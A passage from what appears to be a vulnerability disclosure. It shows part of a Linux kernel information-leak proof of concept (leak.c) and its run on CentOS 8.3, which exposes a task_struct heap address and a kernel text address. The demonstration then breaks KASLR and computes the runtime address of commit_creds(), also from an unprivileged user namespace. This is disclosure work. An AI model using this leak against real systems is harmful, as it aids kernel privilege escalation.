class="enlighter-s0">"leak: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">text</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">52</span><span class="enlighter-text">                 </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">53</span><span class="enlighter-text">        </span><span class="enlighter-c0"> #endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">54</span><span class="enlighter-text">        </span><span class="enlighter-c0"> #ifdef S9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">55</span><span class="enlighter-text">                 </span><span class="enlighter-k1">for</span><span class="enlighter-g1">(</span><span class="enlighter-text">i = </span><span class="enlighter-n1">0</span><span class="enlighter-text">; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">2</span><span class="enlighter-text">; i++</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">56</span><span class="enlighter-text">                         heap = b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">off</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">57</span><span class="enlighter-text">                         text = </span><span class="enlighter-g1">((</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">nr</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">32</span><span class="enlighter-text"> </span><span class="enlighter-g0">|</span><span class="enlighter-text"> b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">flags</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">58</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">59</span><span class="enlighter-text">                         </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"leak: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">heap</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">60</span><span class="enlighter-text">                         </span><span class="enlighter-k1">if</span><span class="enlighter-g1">(</span><span class="enlighter-text">text != </span><span class="enlighter-n1">0</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">61</span><span class="enlighter-text">                                 </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"leak: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">text</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">62</span><span class="enlighter-text">                         </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">63</span><span class="enlighter-text">                 </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">64</span><span class="enlighter-text">        </span><span class="enlighter-c0"> #endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">65</span><span class="enlighter-text">        </span><span class="enlighter-c0"> #ifdef RHEL8</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">66</span><span class="enlighter-text">                 </span><span class="enlighter-k1">for</span><span class="enlighter-g1">(</span><span class="enlighter-text">i = </span><span class="enlighter-n1">0</span><span class="enlighter-text">; i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">1</span><span class="enlighter-text">; i++</span><span class="enlighter-g1">){</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">67</span><span class="enlighter-text">                         heap = b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">off</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">68</span><span class="enlighter-text">                         text = </span><span class="enlighter-g1">((</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">nr</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">32</span><span class="enlighter-text"> </span><span class="enlighter-g0">|</span><span class="enlighter-text"> b</span><span class="enlighter-g1">[</span><span class="enlighter-text">i</span><span class="enlighter-g1">]</span><span class="enlighter-text">.</span><span class="enlighter-m3">flags</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">69</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">70</span><span class="enlighter-text">                         </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"heap: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">heap</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">71</span><span class="enlighter-text">                         </span><span class="enlighter-m0">printf</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"text: 0x%lx\n"</span><span class="enlighter-text">,</span><span class="enlighter-g1">(</span><span class="enlighter-text">unsigned long</span><span class="enlighter-g1">)</span><span class="enlighter-text">text</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">72</span><span class="enlighter-text">                 </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">73</span><span class="enlighter-text">        </span><span class="enlighter-c0"> #endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text">---</span></div></div></div><div class="enlighter-raw">ile: leak.c
---
...
45         #ifdef S10
46                 for(i = 0; i &lt; 7; i++){
47                         heap = b[i].off;
48                         text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);
49 
50                         printf("leak: 0x%lx\n",(unsigned long)heap);
51                         printf("leak: 0x%lx\n",(unsigned long)text);
52                 }
53         #endif
54         #ifdef S9
55                 for(i = 0; i &lt; 2; i++){
56                         heap = b[i].off;
57                         text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);
58 
59                         printf("leak: 0x%lx\n",(unsigned long)heap);
60                         if(text != 0){
61                                 printf("leak: 0x%lx\n",(unsigned long)text);
62                         }
63                 }
64         #endif
65         #ifdef RHEL8
66                 for(i = 0; i &lt; 1; i++){
67                         heap = b[i].off;
68                         text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);
69 
70                         printf("heap: 0x%lx\n",(unsigned long)heap);
71                         printf("text: 0x%lx\n",(unsigned long)text);
72                 }
73         #endif
...
---</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ile: leak.c
---
...
45         #ifdef S10
46                 for(i = 0; i &lt; 7; i++){
47                         heap = b[i].off;
48                         text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);
49 
50                         printf("leak: 0x%lx\n",(unsigned long)heap);
51                         printf("leak: 0x%lx\n",(unsigned long)text);
52                 }
53         #endif
54         #ifdef S9
55                 for(i = 0; i &lt; 2; i++){
56                         heap = b[i].off;
57                         text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);
58 
59                         printf("leak: 0x%lx\n",(unsigned long)heap);
60                         if(text != 0){
61                                 printf("leak: 0x%lx\n",(unsigned long)text);
62                         }
63                 }
64         #endif
65         #ifdef RHEL8
66                 for(i = 0; i &lt; 1; i++){
67                         heap = b[i].off;
68                         text = ((unsigned long)b[i].nr &lt;&lt; 32 | b[i].flags);
69 
70                         printf("heap: 0x%lx\n",(unsigned long)heap);
71                         printf("text: 0x%lx\n",(unsigned long)text);
72                 }
73         #endif
...
---</pre>



<p><strong>Demonstration</strong></p>



<p>In this section we show the execution of the proof of concept on the affected distributions and devices. The content leaked by the proof of concept might vary because the stack layout might be different during the execution of the proof of concept. What is described here is the result of the execution of the proof of concept on the virtual machines and the real Samsung devices we tested it on.</p>



<p>On Red Hat Enterprise Linux 8 and all distributions based on it, the proof of concept seems to leak two kernel addresses, one from the kernel heap and the other one from the kernel .text section. The address from the heap is the <code>struct task_struct</code> of the proof of concept process. It means the proof of concept leaks the address of its own struct task_truct. That is the structure that stores all process information including user credentials. The address from the kernel .text section is the address of the function <code>child_wait_callback()</code>. It leaks the randomized address of the function <code>child_wait_callback()</code> then once the attacker has the non-randomized address of the function <code>child_wait_callback()</code>, they can then calculate the KALSR slide and break the KASLR randomization. The non-randomized address of any kernel function can be easily obtained through several ways.</p>



<p><em>CentOS 8.3</em></p>



<p>Execution of the proof of concept on the latest kernel release on CentOS 8.3 (kernel 4.18.0-240.15.1.el8_3.x86_64).</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">$ cat /etc/centos-release</span></div></div><div class=""><div><span class="enlighter-text">CentOS Linux release </span><span class="enlighter-n0">8.3</span><span class="enlighter-text">.</span><span class="enlighter-m3">2011</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">$</span><span class="enlighter-text"> uname -a</span></div></div><div class=""><div><span class="enlighter-text">Linux centos82research </span><span class="enlighter-n0">4.18</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">-</span><span class="enlighter-n0">240.15</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">el8_3</span><span class="enlighter-text">.</span><span class="enlighter-m3">x86_64</span><span class="enlighter-c0"> #1 SMP Mon Mar 1 17:16:16 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">$</span><span class="enlighter-text"> gcc leak.</span><span class="enlighter-m3">c</span><span class="enlighter-text"> -o leak -DRHEL8 -Wall</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">$</span><span class="enlighter-text"> ./leak </span></div></div><div class=""><div><span class="enlighter-text">heap: </span><span class="enlighter-n2">0xffff8d47495d5f00</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">text: </span><span class="enlighter-n2">0xffffffffb42b8d60</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">$</span></div></div></div><div class="enlighter-raw">$ cat /etc/centos-release
CentOS Linux release 8.3.2011
$ uname -a
Linux centos82research 4.18.0-240.15.1.el8_3.x86_64 #1 SMP Mon Mar 1 17:16:16 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$ gcc leak.c -o leak -DRHEL8 -Wall
$ ./leak 
heap: 0xffff8d47495d5f00
text: 0xffffffffb42b8d60
$</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ cat /etc/centos-release
CentOS Linux release 8.3.2011
$ uname -a
Linux centos82research 4.18.0-240.15.1.el8_3.x86_64 #1 SMP Mon Mar 1 17:16:16 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$ gcc leak.c -o leak -DRHEL8 -Wall
$ ./leak 
heap: 0xffff8d47495d5f00
text: 0xffffffffb42b8d60
$</pre>



<p>Using GDB attached to the virtual machine running CentOS 8.3 (kernel 4.18.0-240.15.1.el8_3.x86_64), we can confirm the heap address leaked is its own <code>struct task_struct</code> (process ./leak). If we ask GDB to interpret the address leaked (<code>0xffff8d47495d5f00</code>) as a <code>struct task_struct</code>, we can see the process PID and the process name.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">(</span><span class="enlighter-text">gdb</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">print</span><span class="enlighter-text"> </span><span class="enlighter-g1">((</span><span class="enlighter-text">struct task_struct *</span><span class="enlighter-g1">)</span><span class="enlighter-n2">0xffff8d47495d5f00</span><span class="enlighter-g1">)</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">pid</span></div></div><div class=""><div><span class="enlighter-text">$</span><span class="enlighter-n1">55</span><span class="enlighter-text"> = </span><span class="enlighter-m0">2116</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">(</span><span class="enlighter-text">gdb</span><span class="enlighter-g1">)</span><span class="enlighter-text"> print/</span><span class="enlighter-m0">s</span><span class="enlighter-text"> </span><span class="enlighter-g1">((</span><span class="enlighter-text">struct task_struct *</span><span class="enlighter-g1">)</span><span class="enlighter-n2">0xffff8d47495d5f00</span><span class="enlighter-g1">)</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">comm</span></div></div><div class=""><div><span class="enlighter-text">$</span><span class="enlighter-n1">56</span><span class="enlighter-text"> = </span><span class="enlighter-s0">"leak\000)\000\000\060\000\000\000\000\000\000"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">(</span><span class="enlighter-text">gdb</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span></div></div></div><div class="enlighter-raw">(gdb) print ((struct task_struct *)0xffff8d47495d5f00)-&gt;pid
$55 = 2116
(gdb) print/s ((struct task_struct *)0xffff8d47495d5f00)-&gt;comm
$56 = "leak\000)\000\000\060\000\000\000\000\000\000"
(gdb) </div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(gdb) print ((struct task_struct *)0xffff8d47495d5f00)-&gt;pid
$55 = 2116
(gdb) print/s ((struct task_struct *)0xffff8d47495d5f00)-&gt;comm
$56 = "leak\000)\000\000\060\000\000\000\000\000\000"
(gdb) </pre>



<p>Using the crash tool, we also have the same result. It says the <code>struct task_struct</code> of the proof of concept is <code>0xffff8d47495d5f00</code> and its PID is 2116.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">crash</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> ps leak</span></div></div><div class=""><div><span class="enlighter-text">   PID    PPID  CPU       TASK        ST  %MEM     VSZ    RSS  COMM</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-n1">2116</span><span class="enlighter-text">   </span><span class="enlighter-n1">1989</span><span class="enlighter-text">   </span><span class="enlighter-n1">1</span><span class="enlighter-text">  ffff8d47495d5f00  </span><span class="enlighter-k1">IN</span><span class="enlighter-text">   </span><span class="enlighter-n0">0.1</span><span class="enlighter-text">    </span><span class="enlighter-n1">4332</span><span class="enlighter-text">   </span><span class="enlighter-n1">1424</span><span class="enlighter-text">  leak</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-n1">2117</span><span class="enlighter-text">   </span><span class="enlighter-n1">2116</span><span class="enlighter-text">   </span><span class="enlighter-n1">0</span><span class="enlighter-text">  ffff8d47496a2f80  TR   </span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-n1">0</span><span class="enlighter-text">    </span><span class="enlighter-n1">4200</span><span class="enlighter-text">     </span><span class="enlighter-n1">72</span><span class="enlighter-text">  leak</span></div></div><div class=""><div><span class="enlighter-text">crash</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span></div></div></div><div class="enlighter-raw">crash&gt; ps leak
   PID    PPID  CPU       TASK        ST  %MEM     VSZ    RSS  COMM
   2116   1989   1  ffff8d47495d5f00  IN   0.1    4332   1424  leak
   2117   2116   0  ffff8d47496a2f80  TR   0.0    4200     72  leak
crash&gt; </div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">crash&gt; ps leak
   PID    PPID  CPU       TASK        ST  %MEM     VSZ    RSS  COMM
   2116   1989   1  ffff8d47495d5f00  IN   0.1    4332   1424  leak
   2117   2116   0  ffff8d47496a2f80  TR   0.0    4200     72  leak
crash&gt; </pre>



<p>The other address leaked is the randomized address of the function child_wait_callback(). We can confirm that by reading <code>/proc/kallsyms</code> as root user.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">$ sudo cat /proc/kallsyms |grep child_wait_callback</span></div></div><div class=""><div><span class="enlighter-text">ffffffffb42b8d60 t child_wait_callback</span></div></div><div class=""><div><span class="enlighter-text">$</span></div></div></div><div class="enlighter-raw">$ sudo cat /proc/kallsyms |grep child_wait_callback
ffffffffb42b8d60 t child_wait_callback
$</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ sudo cat /proc/kallsyms |grep child_wait_callback
ffffffffb42b8d60 t child_wait_callback
$</pre>



<p>The non-randomized address of the function can be obtained by read the kernel respective System.map on /boot.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">$ sudo cat /boot/System.</span><span class="enlighter-m3">map</span><span class="enlighter-text">-</span><span class="enlighter-n0">4.18</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">-</span><span class="enlighter-n0">240.15</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">el8_3</span><span class="enlighter-text">.</span><span class="enlighter-m3">x86_64</span><span class="enlighter-text"> |grep child_wait_callback</span></div></div><div class=""><div><span class="enlighter-text">ffffffff810b8d60 t child_wait_callback</span></div></div><div class=""><div><span class="enlighter-text">$</span></div></div></div><div class="enlighter-raw">$ sudo cat /boot/System.map-4.18.0-240.15.1.el8_3.x86_64 |grep child_wait_callback
ffffffff810b8d60 t child_wait_callback
$</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ sudo cat /boot/System.map-4.18.0-240.15.1.el8_3.x86_64 |grep child_wait_callback
ffffffff810b8d60 t child_wait_callback
$</pre>



<p>Calculating the difference between the randomized and the non-randomized address, the KASLR slide used to randomize all kernel functions is obtained.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">(</span><span class="enlighter-text">gdb</span><span class="enlighter-g1">)</span><span class="enlighter-text"> print/x </span><span class="enlighter-n2">0xffffffffb42b8d60</span><span class="enlighter-text"> - </span><span class="enlighter-n2">0xffffffff810b8d60</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">$</span><span class="enlighter-n1">1</span><span class="enlighter-text"> = </span><span class="enlighter-m0">0x33200000</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">(</span><span class="enlighter-text">gdb</span><span class="enlighter-g1">)</span></div></div></div><div class="enlighter-raw">(gdb) print/x 0xffffffffb42b8d60 - 0xffffffff810b8d60
$1 = 0x33200000
(gdb)</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(gdb) print/x 0xffffffffb42b8d60 - 0xffffffff810b8d60
$1 = 0x33200000
(gdb)</pre>



<p>Once the attacker has the KASLR slide, the KASLR security mitigation is broke and they know the exact location of all kernel functions.</p>



<p>Non-randomized address of the function commit_creds() from kernel-4.18.0-240.15.1.el8_3.x86_64.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">$ sudo cat /boot/System.</span><span class="enlighter-m3">map</span><span class="enlighter-text">-</span><span class="enlighter-n0">4.18</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">-</span><span class="enlighter-n0">240.15</span><span class="enlighter-text">.</span><span class="enlighter-m3">1</span><span class="enlighter-text">.</span><span class="enlighter-m3">el8_3</span><span class="enlighter-text">.</span><span class="enlighter-m3">x86_64</span><span class="enlighter-text"> |grep -w commit_creds</span></div></div><div class=""><div><span class="enlighter-text">ffffffff810dbf50 T commit_creds</span></div></div><div class=""><div><span class="enlighter-text">$</span></div></div></div><div class="enlighter-raw">$ sudo cat /boot/System.map-4.18.0-240.15.1.el8_3.x86_64 |grep -w commit_creds
ffffffff810dbf50 T commit_creds
$</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ sudo cat /boot/System.map-4.18.0-240.15.1.el8_3.x86_64 |grep -w commit_creds
ffffffff810dbf50 T commit_creds
$</pre>



<p>Adding the KASLR slide to the non-randomized address of the function commit_creds(), the randomized address is obtained.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">(</span><span class="enlighter-text">gdb</span><span class="enlighter-g1">)</span><span class="enlighter-text"> print/x </span><span class="enlighter-n2">0xffffffff810dbf50</span><span class="enlighter-text"> + </span><span class="enlighter-n2">0x33200000</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">$</span><span class="enlighter-n1">1</span><span class="enlighter-text"> = </span><span class="enlighter-m0">0xffffffffb42dbf50</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">(</span><span class="enlighter-text">gdb</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g0">$</span><span class="enlighter-text"> sudo cat /proc/kallsyms |grep ffffffffb42dbf50</span></div></div><div class=""><div><span class="enlighter-text">ffffffffb42dbf50 T commit_creds</span></div></div><div class=""><div><span class="enlighter-text">$</span></div></div></div><div class="enlighter-raw">(gdb) print/x 0xffffffff810dbf50 + 0x33200000
$1 = 0xffffffffb42dbf50
(gdb)

...

$ sudo cat /proc/kallsyms |grep ffffffffb42dbf50
ffffffffb42dbf50 T commit_creds
$</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(gdb) print/x 0xffffffff810dbf50 + 0x33200000
$1 = 0xffffffffb42dbf50
(gdb)

...

$ sudo cat /proc/kallsyms |grep ffffffffb42dbf50
ffffffffb42dbf50 T commit_creds
$</pre>



<p>The vulnerable function can also be triggered from an unprivileged user namespace.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw" title="Plain text"></div><div class="enlighter-btn enlighter-btn-copy" title="Copy to clipboard"></div><div class="enlighter-btn enlighter-btn-window" title="Open code in new window"></div><div class="enlighter-btn enlighter-btn-website" title="EnlighterJS 3 Syntax Highlighter"></div></div><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">$ unshare -Ur ./leak </span></div></div><div class=""><div><span class="enlighter-text">heap: </span><span class="enlighter-n2">0xffff8d47495d2f80</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">text: </span><span class="enlighter-n2">0xffffffffb42b8d60</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">$</span></div></div></div><div class="enlighter-raw">$ unshare -Ur ./leak 
heap: 0xffff8d47495d2f80
text: 0xffffffffb42b8d60
$</div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ unshare -Ur ./leak 
heap: 0xffff8d47495d2f80
text: 0xffffffffb42b8d60
$</pre>



